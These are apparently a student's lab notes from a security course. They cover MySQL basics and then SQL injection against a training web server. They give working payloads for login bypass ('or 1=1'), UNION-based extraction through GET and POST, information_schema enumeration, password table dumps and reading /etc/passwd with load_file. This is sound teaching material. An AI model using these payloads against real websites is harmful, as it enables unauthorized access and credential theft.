@@ -1,0 +1,460 @@
+#Day 3 - SQL
+
+mysql
+mysql --user=username --pass=password
+
+Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04
+
+show databases;
+
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| session            |
++--------------------+
+
+Default Databases
+information_schema: Database of databases, provides list of all databases, tables, and columns
+mysql: mysql user list
+performance_schema: Metrics of SQL server
+
+Custom Databases
+session: Created database
+
+
+
+show tables from information_schema;
+show tables from session;
+
++-------------------+
+| Tables_in_session |
++-------------------+
+| Tires             |
+| car               |
+| session_log       |
+| user              |
+| userinfo          |
++-------------------+
+
+
+select * from session.Tires;
+
+Default SQL Statement
+select <column> from <database>.<table>;
+
+select name,size from session.Tires;
+
++-------------+------+
+| name        | size |
++-------------+------+
+| Goodyear    |   16 |
+| Copper      |   16 |
+| Bridgestone |   17 |
+| General     |   12 |
++-------------+------+
+
+select size,name from session.Tires;
++------+-------------+
+| size | name        |
++------+-------------+
+|   16 | Goodyear    |
+|   16 | Copper      |
+|   17 | Bridgestone |
+|   12 | General     |
++------+-------------+
+
+#Nesting/Display both Tires table and cars table
+Default SQL Statement
+select <column> from <database>.<table>;
+
+select * from session.Tires; select * from session.car;
+
+#Combining/Joining commands
+select * from session.Tires UNION select * from session.car;
+
+ERROR: ERROR 1222 (21000): The used SELECT statements have a different number of columns
+
+Tires: 4
+cars: 6
+
+Remidiate: Add null columns or subtract the excess columns
+
+Add:
+select *,1,2 from session.Tires UNION select * from session.car;
+
+select * from session.car UNION select *,1,2 from session.Tires;
+
+select * from session.car UNION select *,null,null from session.Tires;
+
+Subtract:
+select * from session.Tires UNION select carid,name,type,cost FROM session.car;
+
+
+Default SQL Syntax
+SELECT <columns> FROM <database>.<table>;
+
+#Unsanitized vs Sanitized
+' = To modify backend code that utilizes quotation marks
+/ = Escape
+( or ) = to close off backened code that utilizes this
+
+
+Gmail
+Username: JohnDoe243
+Password: paas1234
+
+$name = JohnDoe243
+$pass = paas1234
+
+SELECT id FROM users WHERE name='$name' AND pass='$pass'
+
+SELECT id FROM users WHERE name='JohnDoe243' AND pass='paas1234'
+
+daniel.nguyen
+thisisasupersecurepassword
+
+$name = daniel.nguyen
+$pass = thisisasupersecurepassworf
+
+SELECT id FROM users WHERE name='daniel.nguyen' AND pass='thisisasupersecurepassworf'
+
+Truth Statement
+<value>' or 1='1
+
+SELECT id FROM users WHERE name='<value>' or 1='1' AND pass='$pass'
+
+SELECT id FROM users WHERE name='[<value>' or 1='1]' AND pass='[<value>' or 1='1]'
+
+
+SELECT id FROM users WHERE name=' asdf or 1=1 ' AND pass='$pass'
+
+
+name=' asdf' or 1='1 ' 
+name=' asdf or 1=1 '
+
+
+
+name='[<value>' or 1='1]'
+
+pass='[<value>' or 1='1]'
+
+# = Commenting out
+
+SELECT id FROM users WHERE name='<value>' or 1='1; #' or 1='1' AND pass='$pass'
+
+
+<value>' or 1='1'; #
+
+
+
+SELECT id FROM users WHERE name='<value>' or 1='1' AND pass='(value or  1=1)# or alfjkal; )'
+$pass = "value or  1=1#
+
+
+#SQL Injection - Login Pages
+http://10.50.21.1/
+
+F12 Dev Console > Network Tab > Headers Tab
+
+dan
+thisisapassword
+
+Truth Statement
+<value>' or 1='1
+<value>' or 1='1;
+<value>' or 1='1; #
+
+dan' or 1='1
+
+1. Determine the behavior
+dan
+thisisapassword
+
+2. Determine if webpage is vulernable to SQL injection
+
+Truth Statement
+<value>' or 1='1
+<value>' or 1='1;
+<value>' or 1='1; #
+
+dan' or 1='1
+
+Result: welcome comradeadmin 
+
+3. Retrieved/Dump information using GET Method
+
+F12 Dev Console > Network Tab > Headers Tab
+
+username: dan' or 1='1
+passwd: dan' or 1='1
+
+http://10.50.21.1/login.php
+http://10.50.21.1/login.php?
+? = Query String Parameters to follow
+
+http://10.50.21.1/login.php?username
+http://10.50.21.1/login.php?username=
+http://10.50.21.1/login.php?username=dan'+or+1='1
+http://10.50.21.1/login.php?username=dan'+or+1='1&
+http://10.50.21.1/login.php?username=dan'+or+1='1&passwd
+http://10.50.21.1/login.php?username=dan'+or+1='1&passwd=
+http://10.50.21.1/login.php?username=dan'+or+1='1&passwd=dan'+or+1='1
+
+
+
+#SQL Injection - POST Method
+http://10.50.21.1/Union.html
+
+0. Determine normal behavior
+Only valid entries will provide information
+Toyota = Not valid entry, did not display webpage with data
+
+1. Determine if the webpage is vulnerable via Truth Statement
+Truth Statement
+<value>' or 1='1
+<value>' or 1='1;
+<value>' or 1='1; #
+
+Ford' or 1='1
+Ford' or 1='1;
+Ford' or 1='1; #
+
+Dodge' or 1='1
+Dodge' or 1='1;
+Dodge' or 1='1; #
+
+Honda' or 1='1
+Honda' or 1='1;
+Honda' or 1='1; #
+
+Audi' or 1='1		<= works
+Audi' or 1='1;		<= works
+Audi' or 1='1;#		<= works
+
+2. Determine the number of columns from the table that the webpage is displaying
+
+Webpage
+Columns: 4 <=== Start w/ lowest number
+Rows: 5
+
+Audi' or 1='1		<= works
+Audi' or 1='1;		<= works
+Audi' or 1='1;#		<= works
+
+Default SQL Syntax
+select <column> from <database>.<table>
+select <column>,1,2 from <database>.<table>
+
+Audi' UNION select 1,2,3,4		<= nope
+Audi' UNION select 1,2,3,4;		<= nope
+Audi' UNION select 1,2,3,4; #	<= nope
+
+Audi' UNION select 1,2,3,4,5		<= nope
+Audi' UNION select 1,2,3,4,5;		<= nope
+Audi' UNION select 1,2,3,4,5; #		<= works
+
+3. Determine the number of columns, order and hidden
+
+Audi' UNION select 1,2,3,4,5; #		<= works
+
+Columns: 5
+Order: 1,3,4,5
+2,1,3,4,5
+1,2,3,4,5
+1,3,4,5,2
+Hidden: 2
+
+4. Extract information via Golden Statement
+Default SQL Syntax
+select <column> from <database>.<table>
+select <column>,1,2 from <database>.<table>
+
+
+Default Golden Statement
+select table_schema,table_name,column_name from information_schema.columns
+
+information_schema = database, database of information (database, tables and column names)
+columns = table, table within information_schema database
+
+table_schema = columns, database names
+table_name = columns, table_names
+column_name = columns, columns_names
+
+Audi' UNION select 1,2,3,4,5; #
+
+Audi' UNION select table_schema,table_name,column_name from information_schema.columns; #
+
+Audi' UNION select table_schema,table_name,column_name,1,2 from information_schema.columns; #
+
+Hidden: 2
+
+1			|2 (hidden)	|3 			|4		|5
+table_schema table_name  column_name 1		 2
+
+1 Displayed a list of database names
+3 Displayed a list of column names
+
+Audi' UNION select table_schema,table_name,column_name,1,2 from information_schema.columns; #
+
+Audi' UNION select table_schema,null,table_name,column_name,1 from information_schema.columns; #
+
+
+5. Extracting Desired Information
+Audi' UNION select table_schema,null,table_name,column_name,1 from information_schema.columns; #
+
+Database: session
+Table: userinfo
+Columns: studentID, username, passwd
+
+Audi' UNION select table_schema,null,table_name,column_name,1 from information_schema.columns; #
+
+Audi' UNION select table_schema,null,table_name,column_name,1 from information_schema.columns; #
+
+studentID,null,username,passwd,null
+session.userinfo
+
+
+Audi' UNION select studentID,null,username,passwd,null FROM session.userinfo; #
+
+
+#SQL Injection - GET Method
+0. Determine the normal behavior
+Goodyear
+http://10.50.21.1/uniondemo.php?Selection=1&Submit=Submit
+
+Cooper
+http://10.50.21.1/uniondemo.php?Selection=2&Submit=Submit
+
+Bridgestone
+http://10.50.21.1/uniondemo.php?Selection=3&Submit=Submit
+
+General
+http://10.50.21.1/uniondemo.php?Selection=4&Submit=Submit
+
+1. Determine if the webpage is vulnerable via Truth Statement
+Truth Statement
+<value> or 1=1
+<value> or 1=1;
+<value> or 1=1; #
+
+1 Not Vulnerable
+http://10.50.21.1/uniondemo.php?Selection=1 OR 1=1
+http://10.50.21.1/uniondemo.php?Selection=1 OR 1=1;
+http://10.50.21.1/uniondemo.php?Selection=1 OR 1=1; #
+
+2 Vulnerable
+http://10.50.21.1/uniondemo.php?Selection=2 OR 1=1
+http://10.50.21.1/uniondemo.php?Selection=2 OR 1=1;
+http://10.50.21.1/uniondemo.php?Selection=2 OR 1=1; #
+
+3 Vulnerable
+http://10.50.21.1/uniondemo.php?Selection=3 OR 1=1
+http://10.50.21.1/uniondemo.php?Selection=3 OR 1=1;
+http://10.50.21.1/uniondemo.php?Selection=3 OR 1=1; #
+
+4 Vulnerable
+http://10.50.21.1/uniondemo.php?Selection=4 OR 1=1
+http://10.50.21.1/uniondemo.php?Selection=4 OR 1=1;
+http://10.50.21.1/uniondemo.php?Selection=4 OR 1=1; #
+
+2. Determine the number of columns from the table that the webpage is displaying
+
+Webpage
+Columns: 3 <=== Start w/ lowest number
+Rows: 5
+
+http://10.50.21.1/uniondemo.php?Selection=2 OR 1=1
+http://10.50.21.1/uniondemo.php?Selection=2 OR 1=1;
+http://10.50.21.1/uniondemo.php?Selection=2 OR 1=1; #
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3;
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #
+
+3. Determine the number of columns, order, and hidden
+Columns: 3
+Order: 1,3,2
+Hidden: N/A
+
+Backend
+1		|2		|3
+
+
+Webpage
+1		|3		|2
+
+
+4. Extract information via Golden Statement
+Default SQL Syntax
+select <column> from <database>.<table>
+select <column>,1,2 from <database>.<table>
+
+Default Golden Statement
+select table_schema,table_name,column_name from information_schema.columns
+
+information_schema = database, database of information (database, tables and column names)
+columns = table, table within information_schema database
+
+table_schema = columns, database names
+table_name = columns, table_names
+column_name = columns, columns_names
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,table_name,column_name from information_schema.columns; #
+
+Backend
+1		  |2		  |3
+t_schema  t_name  		column_name
+
+Webpage
+1			|3				|2
+t_schema	column_name		t_name
+
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,table_name,column_name from information_schema.columns; #
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns; #
+
+Backend
+1		  	|2		 		|3
+t_schema  	column_name		t_name
+
+Webpage
+1			|3				|2
+t_schema	t_name  		column_name
+
+5. Extract desire information
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns; #
+
+Database: session
+Table: user
+Columns: name,pass,id <== Display order
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns; #
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select name,id,pass from session.user; #
+
+
+#Version and Functions and Filtering
+@@version
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,@@version; #
+
+#Functions
+load_file('')
+load_file('/etc/passwd')
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,load_file('/etc/passwd'); #
+
+#Filtering
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns; #
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns WHERE table_schema='session'; #
